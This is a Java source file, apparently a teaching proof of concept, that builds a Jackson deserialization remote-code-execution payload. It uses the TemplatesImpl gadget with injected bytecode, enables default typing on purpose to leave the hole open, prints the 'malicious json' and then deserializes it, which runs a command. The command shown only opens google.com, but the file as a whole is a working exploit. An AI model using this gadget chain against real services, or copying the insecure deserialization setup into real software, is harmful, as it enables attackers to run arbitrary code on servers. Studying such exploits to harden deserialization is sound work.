// The MIT License (MIT)
// Copyright (c) 2017 Moritz Bechler
// Copyright (c) 2018 Robert C. Seacord
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

package jackson;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;

import com.fasterxml.jackson.databind.node.ArrayNode;
import com.fasterxml.jackson.databind.node.ObjectNode;
import javassist.CannotCompileException;
import javassist.NotFoundException;

import java.util.Base64;

public class Cage {

  private static final ObjectMapper mapper = new ObjectMapper();

  private static Object deserialize(String data) throws IOException {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();
    // deserialize as Object or permissive tag interfaces such as java.io.Serializable
    return mapper.readValue(data, Object.class);
  }

  private static byte[] createExecByteCodes()
      throws IOException, CannotCompileException, NotFoundException, ClassNotFoundException {
    String[] args = {"open", "http://www.google.com"};
    return TemplatesUtil.createExecBytecodes(args, Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"));
  }

  private static JsonNode createTemplateValues()
      throws IOException, CannotCompileException, NotFoundException, ClassNotFoundException {
    ObjectNode values = mapper.createObjectNode();
    byte[] byteCodes = createExecByteCodes();
    String encodedByteCodes = Base64.getEncoder().encodeToString(byteCodes);

    ArrayNode transletBytescodes = mapper.createArrayNode();
    transletBytescodes.add(encodedByteCodes);
    values.set("transletBytecodes", transletBytescodes);

    values.put("transletName", "foo");
    values.set("outputProperties", mapper.createObjectNode());
    return values;
  }

  public static String rcePayload() throws ClassNotFoundException, CannotCompileException,
                                           NotFoundException, IOException {
    JsonNode templateValues = createTemplateValues();
    ArrayNode wrapperNode = mapper.createArrayNode();
    wrapperNode.add("org.apache.xalan.xsltc.trax.TemplatesImpl");
    wrapperNode.add(templateValues);
    return mapper.writerWithDefaultPrettyPrinter().writeValueAsString(wrapperNode);
  }

  public static void main(String[] args) throws Exception {

    // Writes gadget by hand and then deserializes using unmarshal
    String json = rcePayload();
    System.out.println("Malicious json: " + json);
    deserialize(json);
  }

} // end class Cage
